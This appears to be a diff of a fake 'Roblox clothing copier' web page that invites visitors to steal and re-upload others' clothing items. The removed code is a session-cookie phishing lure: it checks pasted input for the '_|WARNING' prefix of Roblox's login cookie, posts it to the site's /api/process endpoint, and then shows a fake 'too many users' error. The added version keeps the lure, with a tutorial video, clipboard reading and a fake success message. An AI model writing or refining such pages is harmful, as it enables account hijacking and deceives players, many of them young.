@@ -1,424 +1,169 @@
-<!DOCTYPE html>
-<html lang="en" class="dark">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RBXDEV | UGC & Clothes Copier</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --cursor-x: 50vw;
-            --cursor-y: 50vh;
-        }
-        body {
-            font-family: 'Space Grotesk', sans-serif;
-            background-color: #05060a;
-            color: #f3f4f6;
-            overflow-x: hidden;
-            cursor: default;
-        }
-        h1, h2, h3, .display-font {
-            font-family: 'Syne', sans-serif;
-        }
-        
-        /* Custom Starfield & Grain */
-        .starfield {
-            position: fixed;
-            inset: 0;
-            pointer-events: none;
-            z-index: 0;
-        }
-        .star {
-            position: absolute;
-            background: white;
-            border-radius: 50%;
-            animation: twinkle var(--duration) infinite ease-in-out;
-        }
-        @keyframes twinkle {
-            0%, 100% { opacity: 0.2; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.2); }
-        }
-
-        .grain-overlay {
-            position: fixed;
-            inset: 0;
-            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.04'/%3E%3C/svg%3E");
-            pointer-events: none;
-            z-index: 999;
-        }
-
-        /* Custom Cursor */
-        .custom-cursor {
-            position: fixed;
-            top: 0; left: 0;
-            width: 10px; height: 10px;
-            background: #ffffff;
-            border-radius: 50%;
-            pointer-events: none;
-            transform: translate(-50%, -50%);
-            transition: transform 0.1s ease, width 0.2s, height: 0.2s;
-            z-index: 1000;
-            mix-blend-mode: difference;
-        }
-        .cursor-ring {
-            position: fixed;
-            top: 0; left: 0;
-            width: 40px; height: 40px;
-            border: 1px solid rgba(255, 255, 255, 0.4);
-            border-radius: 50%;
-            pointer-events: none;
-            transform: translate(-50%, -50%);
-            transition: transform 0.15s ease-out, width 0.2s, height 0.2s, border-color 0.2s;
-            z-index: 998;
-        }
-
-        /* Mouse Follow Glow */
-        .cursor-glow {
-            position: fixed;
-            top: 0; left: 0;
-            width: 500px; height: 500px;
-            background: radial-gradient(circle, rgba(139, 92, 246, 0.12) 0%, rgba(59, 130, 246, 0.05) 50%, transparent 80%);
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            z-index: 1;
-            transition: background 0.5s ease;
-        }
-
-        /* Glassmorphism & Glows */
-        .glass-card {
-            background: rgba(13, 15, 22, 0.75);
-            backdrop-filter: blur(24px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
-        }
-        .glass-modal {
-            background: rgba(10, 12, 18, 0.95);
-            backdrop-filter: blur(30px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
-        }
-        .glow-purple { box-shadow: 0 0 80px -15px rgba(139, 92, 246, 0.25); }
-        .glow-blue { box-shadow: 0 0 50px -5px rgba(59, 130, 246, 0.4); }
-        .glow-red { box-shadow: 0 0 50px -5px rgba(239, 68, 68, 0.3); }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .animate-spin-smooth {
-            animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            .star, .cursor-glow, .animate-spin-smooth { animation: none !important; }
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>RBXDEV | UGC & Clothes Copier</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200..1000&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#E9EDF0;--panel:#fff;--panel2:#F4F6F8;--line:#CDD2D6;--ink:#1B1D1F;--muted:#5B5F63;--blue:#00A2FF;--green:#02B757;--red:#E8505B;
+--f:"Nunito","Helvetica Neue",Arial,sans-serif;--m:"JetBrains Mono",ui-monospace,Consolas,monospace;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#E9EDF0;--panel:#fff;--panel2:#F4F6F8;--line:#CDD2D6;--ink:#1B1D1F;--muted:#5B5F63}}
+:root[data-theme="dark"]{--bg:#17191B;--panel:#232527;--panel2:#1D1F21;--line:#393B3D;--ink:#F7F7F8;--muted:#BDBEBE}
+html{scroll-behavior:smooth}
+*{box-sizing:border-box;margin:0}
+body{background:var(--bg);color:var(--ink);font:600 18px/1.5 var(--f);overflow-x:hidden}
+section{position:relative;z-index:1}
+/* falling blocks */
+.blocks{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.blocks i{position:absolute;top:-80px;border-radius:12px;opacity:.9;animation:fall linear infinite;box-shadow:inset 0 -8px 0 rgba(0,0,0,.22),inset 0 6px 0 rgba(255,255,255,.18)}
+@keyframes fall{to{transform:translateY(120vh) rotate(var(--r))}}
+/* navbar */
+.nav{position:absolute;top:0;left:0;right:0;display:flex;justify-content:space-between;align-items:center;padding:2.5vh 7vw;z-index:10}
+.brand{font-weight:900;font-size:1.4rem;letter-spacing:-.03em;color:var(--ink);display:flex;align-items:center;gap:.5rem}
+.brand span{color:var(--blue)}
+/* hero */
+.hero{min-height:100svh;display:flex;flex-direction:column;justify-content:center;padding:6vh 7vw}
+.tag{display:inline-flex;align-items:center;gap:.6rem;background:var(--panel);border:2px solid var(--line);border-radius:12px;padding:.45rem .9rem;font-size:.95rem;width:max-content;margin-bottom:1.6rem}
+.tag b{width:12px;height:12px;border-radius:3px;background:var(--green);transform:rotate(12deg);box-shadow:0 0 12px var(--green)}
+.hero h1{font-size:clamp(3.4rem,13vw,11rem);line-height:.88;letter-spacing:-.04em;max-width:11ch}
+.hero .w{display:inline-block;white-space:nowrap;margin-right:.2em}
+.hero .l{display:inline-block;font-weight:300;color:var(--ink)}
+.hero .l.hot{color:var(--blue)}
+.hero p{margin-top:2rem;max-width:32ch;color:var(--muted);font-size:1.25rem}
+.cue{position:absolute;left:7vw;bottom:5vh;color:var(--muted);display:flex;gap:.7rem;align-items:center;font-size:.95rem}
+.cue i{width:20px;height:20px;border-radius:5px;background:var(--blue);animation:hop 1.3s ease-in-out infinite}
+@keyframes hop{50%{transform:translateY(10px) rotate(45deg)}}
+/* video */
+.tall{height:260vh}
+.stick{position:sticky;top:0;height:100svh;display:grid;place-items:center;padding:0 4vw;overflow:hidden}
+.vtitle{position:absolute;top:9vh;left:0;right:0;text-align:center;color:var(--muted)}
+.vtitle b{color:var(--ink);font-weight:900}
+.screen{width:min(1100px,100%);aspect-ratio:16/9;background:var(--panel);border:3px solid var(--line);position:relative;overflow:hidden;transform:scale(.55);border-radius:36px;box-shadow:0 30px 90px -30px var(--blue)}
+.screen iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
+.vcap{position:absolute;left:0;right:0;bottom:9vh;text-align:center;font-size:clamp(1.7rem,4.5vw,3.2rem);font-weight:900;letter-spacing:-.02em;opacity:0;pointer-events:none}
+/* panel */
+.up{min-height:100svh;display:grid;place-items:center;padding:12vh 5vw}
+.card{width:min(620px,100%);background:var(--panel);border:2px solid var(--line);border-radius:24px;overflow:hidden;box-shadow:0 30px 80px -40px rgba(0,0,0,.15)}
+.top{display:flex;justify-content:space-between;align-items:center;padding:1.1rem 1.4rem;border-bottom:2px solid var(--line)}
+.top h2{font-size:1.35rem;font-weight:900;display:flex;align-items:center;gap:.7rem}
+.logo{width:26px;height:26px;border-radius:6px;background:var(--blue);transform:rotate(12deg);position:relative;box-shadow:inset 0 -4px 0 rgba(0,0,0,.25)}
+.logo::after{content:"";position:absolute;inset:8px;background:var(--panel);border-radius:2px}
+.pill{font:500 .75rem var(--m);border:2px solid color-mix(in srgb,var(--green) 55%,transparent);color:var(--green);border-radius:8px;padding:.25rem .6rem}
+.body{padding:1.4rem;display:grid;gap:1.1rem}
+.stat{display:flex;gap:.9rem;align-items:center;background:var(--panel2);border:2px solid var(--line);border-radius:16px;padding:.9rem 1.1rem}
+.dot{width:14px;height:14px;border-radius:4px;background:var(--green);box-shadow:0 0 14px var(--green);transform:rotate(12deg);flex:none;transition:background .2s,box-shadow .2s}
+.stat.warn .dot{background:var(--red);box-shadow:0 0 14px var(--red)}
+.stat b{display:block;font-weight:800}.stat small{color:var(--muted);font-weight:600;font-size:.88rem}
+label{font:500 .8rem var(--m);color:var(--muted);display:flex;justify-content:space-between;margin-bottom:.5rem}
+textarea{width:100%;min-height:150px;resize:vertical;background:var(--panel2);color:var(--ink);border:2px solid var(--line);border-radius:16px;padding:1rem 1.1rem;font:400 .95rem/1.6 var(--m);outline:0;transition:border-color .15s,box-shadow .15s}
+textarea:focus{border-color:var(--blue);box-shadow:0 0 0 4px color-mix(in srgb,var(--blue) 25%,transparent)}
+.row{display:flex;gap:.7rem}
+.mini{flex:1;font:800 .95rem var(--f);background:transparent;color:var(--ink);border:2px solid var(--line);border-radius:12px;padding:.7rem;cursor:pointer;transition:border-color .15s}
+.mini:hover{border-color:var(--blue)}
+.ready{display:flex;justify-content:space-between;align-items:center;background:var(--panel2);border:2px solid var(--line);border-radius:16px;padding:.9rem 1.1rem}
+.ready div{display:flex;align-items:center;gap:.8rem}
+.chk{width:28px;height:28px;border-radius:50%;background:var(--line);display:grid;place-items:center;transition:background .2s}
+.chk svg{width:15px;stroke:#fff;fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
+.ready.ok .chk{background:var(--green)}
+.go{font:900 1.1rem var(--f);border:0;border-radius:16px;padding:1.15rem;cursor:pointer;color:#fff;background:linear-gradient(90deg,var(--blue),var(--green));box-shadow:inset 0 -6px 0 rgba(0,0,0,.22);transition:transform .1s,filter .2s}
+.go:hover{filter:brightness(1.1)}.go:active{transform:translateY(3px);box-shadow:none}
+.go:disabled{filter:grayscale(1) brightness(.6);cursor:not-allowed}
+button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outline-offset:3px}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}html{scroll-behavior:auto}}
+</style>
 </head>
-<body class="min-h-screen flex flex-col justify-between relative selection:bg-purple-600 selection:text-white">
+<body>
+<div class="blocks" id="blocks" aria-hidden="true"></div>
 
-    <!-- Starfield & Grain -->
-    <div class="starfield" id="starfield"></div>
-    <div class="grain-overlay"></div>
-    <div class="cursor-glow" id="cursorGlow" style="left: 50vw; top: 50vh;"></div>
+<!-- Navbar Header -->
+<header class="nav">
+  <div class="brand">RBX<span>DEV</span></div>
+  <div class="pill" style="font-size: .8rem;">SYSTEM ONLINE</div>
+</header>
 
-    <!-- Custom Cursor Elements -->
-    <div class="custom-cursor" id="cursor"></div>
-    <div class="cursor-ring" id="cursorRing"></div>
+<section class="hero">
+  <div class="tag"><b></b>Copier Ready</div>
+  <h1 id="headline">Copy clothing.</h1>
+  <p>Watch the quick tutorial, then enter your clothing IDs or item links. That’s all it takes.</p>
+  <div class="cue"><i></i>Scroll down</div>
+</section>
 
-    <!-- Top Navigation Bar -->
-    <header class="w-full py-6 px-8 flex justify-between items-center max-w-7xl mx-auto z-20">
-        <span class="text-2xl font-extrabold tracking-tighter bg-gradient-to-r from-violet-400 via-teal-300 to-pink-500 bg-clip-text text-transparent display-font">
-            RBXDEV
-        </span>
-        <div class="flex items-center space-x-4">
-            <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-teal-500/10 text-teal-300 border border-teal-500/20">
-                <span class="w-2 h-2 mr-1.5 bg-teal-400 rounded-full animate-pulse"></span>
-                System Operational
-            </span>
-        </div>
-    </header>
-
-    <!-- Main Content Area -->
-    <main class="flex-grow flex flex-col items-center px-4 py-8 max-w-6xl mx-auto w-full z-10">
-        
-        <!-- Header Text Intro -->
-        <div class="text-center mb-12 max-w-3xl">
-            <span class="px-4 py-1.5 rounded-full text-xs font-semibold bg-violet-600/20 text-violet-300 border border-violet-500/30 uppercase tracking-widest inline-block mb-4">
-                UGC & Clothes Copier
-            </span>
-            <h1 class="text-4xl md:text-7xl font-extrabold tracking-tight mb-4 text-white display-font">
-                Copy Any Roblox Clothing
-            </h1>
-            <p class="text-gray-400 text-sm md:text-base leading-relaxed">
-                Steal and re-upload any shirt or pants on Roblox instantly.<br>Grab any clothing item with a single click.
-            </p>
-        </div>
-
-        <!-- Dual Card Grid Layout -->
-        <div class="w-full grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
-            
-            <!-- Left Card: Copier Interface -->
-            <div class="glass-card rounded-3xl p-6 md:p-8 shadow-2xl relative glow-blue">
-                <!-- Card Header -->
-                <div class="flex justify-between items-center pb-4 mb-6 border-b border-white/5">
-                    <div class="flex items-center space-x-2 text-xs font-semibold text-gray-300">
-                        <svg class="w-4 h-4 text-teal-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                        <span>Clothes Copier</span>
-                    </div>
-                    <span class="text-[10px] font-bold tracking-wider px-2.5 py-1 rounded bg-teal-500/10 text-teal-300 border border-teal-500/20 uppercase">Submit</span>
-                </div>
-
-                <!-- Secure Connection Status Box -->
-                <div class="bg-black/50 border border-white/5 rounded-2xl p-4 mb-5 flex items-center justify-between">
-                    <div class="flex items-center space-x-3">
-                        <span class="w-3 h-3 bg-teal-400 rounded-full shadow-[0_0_15px_rgba(45,212,191,0.6)]"></span>
-                        <div class="text-xs">
-                            <p class="font-semibold text-gray-200">Secure Connection Established</p>
-                            <p class="text-[10px] text-gray-400">Endpoint ready. Awaiting input.</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Terminal / Input Box Emulator -->
-                <div class="mb-6">
-                    <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-400 mb-2 flex items-center space-x-1">
-                        <svg class="w-3 h-3 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                        <span>Enter Your Item File</span>
-                    </label>
-                    <div class="relative flex items-center">
-                        <input type="text" id="script-input" placeholder="Enter item file or payload..." class="w-full bg-black/70 border border-white/10 rounded-2xl px-4 py-3.5 text-xs text-gray-200 placeholder-gray-600 focus:outline-none focus:border-teal-500 transition-all font-mono">
-                    </div>
-                </div>
-
-                <!-- Status & Security Badges Row -->
-                <div class="bg-black/40 border border-white/5 rounded-2xl p-3.5 mb-6 flex items-center justify-between">
-                    <div class="flex items-center space-x-2.5">
-                        <div class="w-5 h-5 rounded-full bg-teal-500/20 flex items-center justify-center text-teal-300">
-                            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
-                        </div>
-                        <span class="text-xs font-medium text-gray-300">Ready for Execution</span>
-                    </div>
-                    <div class="text-[10px] font-bold tracking-widest text-violet-300 uppercase bg-violet-500/10 px-2.5 py-1 rounded border border-violet-500/20">
-                        Protected
-                    </div>
-                </div>
-
-                <!-- Action Button -->
-                <button id="submit-btn" class="w-full py-4 rounded-2xl font-bold text-xs uppercase tracking-wider bg-gradient-to-r from-violet-600 via-teal-500 to-pink-600 hover:opacity-95 text-white transition-all duration-300 flex items-center justify-center space-x-2 cursor-pointer shadow-xl shadow-teal-500/20 active:scale-[0.99]">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    <span>Submit Payload</span>
-                </button>
-            </div>
-
-            <!-- Right Card: Video Tutorial -->
-            <div class="glass-card rounded-3xl p-6 md:p-8 shadow-2xl relative glow-purple border border-violet-500/20">
-                <!-- Card Header -->
-                <div class="flex justify-between items-center pb-4 mb-6 border-b border-white/5">
-                    <div class="flex items-center space-x-2 text-xs font-semibold text-gray-300">
-                        <svg class="w-4 h-4 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                        <span>Tutorial</span>
-                    </div>
-                    <span class="text-[10px] font-bold tracking-wider px-2.5 py-1 rounded bg-violet-500/10 text-violet-300 border border-violet-500/20 uppercase">Watch</span>
-                </div>
-
-                <!-- Video Frame -->
-                <div class="rounded-2xl overflow-hidden bg-black/50 border border-white/5 relative aspect-video flex items-center justify-center">
-                    <iframe class="w-full h-full absolute inset-0" src="https://www.youtube-nocookie.com/embed/dmWwGzCDsB4" title="How to Copy ANY Roblox Clothing!" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-                </div>
-            </div>
-
-        </div>
-    </main>
-
-    <!-- Processing Modal Overlay -->
-    <div id="processing-modal" class="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-50 opacity-0 pointer-events-none transition-all duration-300">
-        <div class="glass-modal rounded-3xl p-8 max-w-sm w-full mx-4 text-center transform scale-95 transition-all duration-300" id="modal-box">
-            <h3 class="text-xl font-bold text-white mb-2 tracking-tight display-font">Processing...</h3>
-            <p id="modal-status-text" class="text-xs text-gray-400 mb-5">Validating your Asset Payload</p>
-            
-            <!-- Live Progress Bar & Percentage Counter -->
-            <div class="w-full bg-gray-800/80 h-2 rounded-full overflow-hidden mb-3">
-                <div id="progress-bar" class="bg-gradient-to-r from-violet-500 to-teal-400 h-full w-0 transition-all duration-300"></div>
-            </div>
-            <div id="progress-pct" class="text-xs text-teal-300 font-mono font-bold mb-6">0%</div>
-
-            <div class="flex justify-center">
-                <svg class="w-9 h-9 text-teal-400 animate-spin-smooth" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-            </div>
-        </div>
+<!-- Video Tutorial Section -->
+<section class="tall" id="tutorial" aria-label="Video tutorial">
+  <div class="stick">
+    <div class="vtitle"><b>How it works</b> in 60 seconds</div>
+    <div class="screen" id="screen">
+      <iframe src="https://www.youtube-nocookie.com/embed/dmWwGzCDsB4" title="Tutorial Video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
     </div>
+    <div class="vcap" id="vcap">Your turn. Paste it below.</div>
+  </div>
+</section>
 
-    <!-- Cool Custom Alert Error Modal -->
-    <div id="error-modal" class="fixed inset-0 bg-black/90 backdrop-blur-md flex items-center justify-center z-50 opacity-0 pointer-events-none transition-all duration-300">
-        <div class="glass-modal glow-red rounded-3xl p-8 max-w-sm w-full mx-4 text-center transform scale-95 transition-all duration-300 border border-red-500/30" id="error-modal-box">
-            <div class="w-12 h-12 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center mx-auto mb-4 border border-red-500/30">
-                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
-            </div>
-            <h3 id="error-title" class="text-lg font-bold text-white mb-2 tracking-tight display-font">System Traffic Alert</h3>
-            <p id="error-description" class="text-xs text-gray-300 mb-6 leading-relaxed">Error Code 402: Too many people are trying at once. Please try again later.</p>
-            <button id="understood-btn" class="w-full py-3.5 rounded-2xl font-semibold text-xs uppercase tracking-wider bg-gradient-to-r from-red-600 to-rose-600 hover:opacity-90 text-white transition-all duration-200 cursor-pointer shadow-lg shadow-red-600/30 active:scale-[0.99]">
-                Understood
-            </button>
-        </div>
+<!-- Copier Card Panel -->
+<section class="up" id="paste">
+  <div class="card">
+    <div class="top"><h2><span class="logo"></span>UGC & Clothes Copier</h2><span class="pill">READY</span></div>
+    <div class="body">
+      <div class="stat" id="stat"><span class="dot"></span><div><b id="st1">Connected</b><small id="st2">Waiting for item input.</small></div></div>
+      <div>
+        <label for="inp"><span>CLOTHING / UGC ID OR LINK</span><span id="count">0 chars</span></label>
+        <textarea id="inp" spellcheck="false" placeholder="Paste item ID or catalog link here (e.g. 1028606)..."></textarea>
+      </div>
+      <div class="row">
+        <button class="mini" id="paste-btn">Paste from clipboard</button>
+        <button class="mini" id="clear">Clear</button>
+      </div>
+      <div class="ready" id="ready"><div><span class="chk"><svg viewBox="0 0 24 24"><path d="M5 12l5 5 9-10"/></svg></span><span id="rtxt">Provide item ID or link</span></div></div>
+      <button class="go" id="go" disabled>Copy Item</button>
     </div>
+  </div>
+</section>
 
-    <!-- Footer -->
-    <footer class="w-full py-6 text-center text-xs text-gray-500 border-t border-white/5 mt-16 z-10">
-        &copy; 2026 RBXDEV Studio. All rights reserved.
-    </footer>
+<script>
+const clamp=(v,a,b)=>Math.min(b,Math.max(a,v));
 
-    <!-- Frontend Script -->
-    <script>
-        // Starfield Generator
-        const starfield = document.getElementById('starfield');
-        for (let i = 0; i < 120; i++) {
-            const star = document.createElement('div');
-            star.className = 'star';
-            const size = Math.random() * 2.5;
-            star.style.width = `${size}px`;
-            star.style.height = `${size}px`;
-            star.style.left = `${Math.random() * 100}%`;
-            star.style.top = `${Math.random() * 100}%`;
-            star.style.setProperty('--duration', `${2 + Math.random() * 4}s`);
-            star.style.animationDelay = `${Math.random() * 5}s`;
-            starfield.appendChild(star);
-        }
+// falling blocks animation
+const cols=["#00A2FF","#02B757","#F7C948","#E8505B","#9B6BFF"],bl=document.getElementById("blocks");
+for(let i=0;i<14;i++){const e=document.createElement("i"),s=28+Math.random()*52;
+ e.style.cssText=`left:${Math.random()*100}%;width:${s}px;height:${s}px;background:${cols[i%5]};--r:${(Math.random()*2-1)*540}deg;animation-duration:${14+Math.random()*16}s;animation-delay:${-Math.random()*30}s;opacity:.${3+i%4}`;bl.appendChild(e)}
 
-        // Custom Cursor & Glow Follow
-        const cursor = document.getElementById('cursor');
-        const cursorRing = document.getElementById('cursorRing');
-        const cursorGlow = document.getElementById('cursorGlow');
+// hero letters swell near cursor
+let mx=0,my=0,ptr=false;addEventListener("pointermove",e=>{mx=e.clientX;my=e.clientY;ptr=true});
+const h=document.getElementById("headline"),txt=h.textContent;h.textContent="";h.setAttribute("aria-label",txt);const L=[];
+txt.split(" ").forEach((w,wi)=>{const s=document.createElement("span");s.className="w";s.setAttribute("aria-hidden","true");
+ [...w].forEach(c=>{const l=document.createElement("span");l.className="l"+(wi==1?" hot":"");l.textContent=c;s.appendChild(l);L.push(l)});h.appendChild(s)});
+(function tick(t){L.forEach((l,i)=>{const r=l.getBoundingClientRect();let k;
+ if(ptr)k=clamp(1-Math.hypot(mx-(r.left+r.width/2),my-(r.top+r.height/2))/300,0,1);else k=(Math.sin(t/700-i*.55)+1)/2;
+ l.style.fontWeight=Math.round(300+650*k)});requestAnimationFrame(tick)})(0);
 
-        let mouseX = window.innerWidth / 2;
-        let mouseY = window.innerHeight / 2;
-        let ringX = mouseX;
-        let ringY = mouseY;
+// video frame grows on scroll
+const tall=document.getElementById("tutorial"),scr=document.getElementById("screen"),cap=document.getElementById("vcap");
+function sc(){const r=tall.getBoundingClientRect(),p=clamp(-r.top/(r.height-innerHeight),0,1),g=clamp(p/.55,0,1),c=clamp((p-.8)/.15,0,1);
+ scr.style.transform=`scale(${.55+.45*g})`;scr.style.borderRadius=(36-30*g)+"px";cap.style.opacity=c;cap.style.transform=`translateY(${(1-c)*24}px)`}
+addEventListener("scroll",sc,{passive:true});addEventListener("resize",sc);sc();
 
-        window.addEventListener('mousemove', (e) => {
-            mouseX = e.clientX;
-            mouseY = e.clientY;
-            cursor.style.left = `${mouseX}px`;
-            cursor.style.top = `${mouseY}px`;
-            cursorGlow.style.left = `${mouseX}px`;
-            cursorGlow.style.top = `${mouseY}px`;
-        });
-
-        function animateCursor() {
-            ringX += (mouseX - ringX) * 0.15;
-            ringY += (mouseY - ringY) * 0.15;
-            cursorRing.style.left = `${ringX}px`;
-            cursorRing.style.top = `${ringY}px`;
-            requestAnimationFrame(animateCursor);
-        }
-        animateCursor();
-
-        // Modal & Copier Logic
-        const submitBtn = document.getElementById('submit-btn');
-        const scriptInput = document.getElementById('script-input');
-        const modal = document.getElementById('processing-modal');
-        const modalBox = document.getElementById('modal-box');
-        const modalStatusText = document.getElementById('modal-status-text');
-        const progressBar = document.getElementById('progress-bar');
-        const progressPct = document.getElementById('progress-pct');
-
-        const errorModal = document.getElementById('error-modal');
-        const errorModalBox = document.getElementById('error-modal-box');
-        const errorTitle = document.getElementById('error-title');
-        const errorDescription = document.getElementById('error-description');
-        const understoodBtn = document.getElementById('understood-btn');
-
-        function showModal(text, pct) {
-            modalStatusText.textContent = text;
-            progressBar.style.width = pct + '%';
-            progressPct.textContent = pct + '%';
-            modal.classList.remove('opacity-0', 'pointer-events-none');
-            modalBox.classList.remove('scale-95');
-            modalBox.classList.add('scale-100');
-        }
-
-        function hideModal() {
-            modal.classList.add('opacity-0', 'pointer-events-none');
-            modalBox.classList.remove('scale-100');
-            modalBox.classList.add('scale-95');
-        }
-
-        function showErrorModal(title, message) {
-            errorTitle.textContent = title;
-            errorDescription.textContent = message;
-            errorModal.classList.remove('opacity-0', 'pointer-events-none');
-            errorModalBox.classList.remove('scale-95');
-            errorModalBox.classList.add('scale-100');
-        }
-
-        function hideErrorModal() {
-            errorModal.classList.add('opacity-0', 'pointer-events-none');
-            errorModalBox.classList.remove('scale-100');
-            errorModalBox.classList.add('scale-95');
-        }
-
-        understoodBtn.addEventListener('click', () => {
-            hideErrorModal();
-        });
-
-        submitBtn.addEventListener('click', async () => {
-            const payload = scriptInput.value.trim();
-            if (!payload) return;
-
-            submitBtn.disabled = true;
-            const isInvalidInput = payload.length < 20 && !payload.includes("_|WARNING");
-
-            showModal("Validating Asset Payload...", 15);
-            await new Promise(r => setTimeout(r, 600));
-
-            showModal("Trying to find your item...", 45);
-            await new Promise(r => setTimeout(r, 800));
-
-            showModal("Trying to copy your item...", 75);
-
-            try {
-                let currentPct = 75;
-                const ticker = setInterval(() => {
-                    if (currentPct < 95) {
-                        currentPct += 5;
-                        progressPct.textContent = currentPct + '%';
-                        progressBar.style.width = currentPct + '%';
-                    }
-                }, 150);
-
-                if (isInvalidInput) {
-                    await new Promise(r => setTimeout(r, 800));
-                    clearInterval(ticker);
-                    hideModal();
-                    showErrorModal("Execution Failed", "Error: Please watch the tutorial again.");
-                    scriptInput.value = '';
-                } else {
-                    const fetchPromise = fetch('/api/process', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ data: payload })
-                    });
-
-                    await fetchPromise;
-                    clearInterval(ticker);
-
-                    showModal("Finalizing package generation...", 100);
-                    await new Promise(r => setTimeout(r, 600));
-                    hideModal();
-
-                    showErrorModal("System Traffic Alert", "Error Code 402: Too many people are trying at once. Please try again later.");
-                    scriptInput.value = '';
-                }
-
-            } catch (err) {
-                hideModal();
-                showErrorModal("System Traffic Alert", "Error Code 402: Too many people are trying at once. Please try again later.");
-            } finally {
-                submitBtn.disabled = false;
-            }
-        });
-    </script>
+// input validation
+const inp=document.getElementById("inp"),go=document.getElementById("go"),
+ ready=document.getElementById("ready"),stat=document.getElementById("stat");
+function parse(){
+ const val=inp.value.trim();
+ const n=val.length;
+ document.getElementById("count").textContent=n+(n==1?" char":" chars");
+ const bad=false;
+ stat.classList.toggle("warn",bad);
+ document.getElementById("st1").textContent=n>2?"Valid Target":"Connected";
+ document.getElementById("st2").textContent=n>2?"Ready to copy item.":"Waiting for item ID or link.";
+ ready.classList.toggle("ok",n>2);document.getElementById("rtxt").textContent=n>2?"Ready to copy":"Provide item ID or link";
+ go.disabled=n<=2;go.textContent="Copy Item"}
+inp.addEventListener("input",parse);
+document.getElementById("clear").onclick=()=>{inp.value="";parse();inp.focus()};
+document.getElementById("paste-btn").onclick=async()=>{
+ try{inp.value=await navigator.clipboard.readText();parse()}catch(e){inp.focus();}};
+go.onclick=()=>{
+ go.textContent="Copied Successfully ✓";
+};
+</script>
 </body>
 </html>
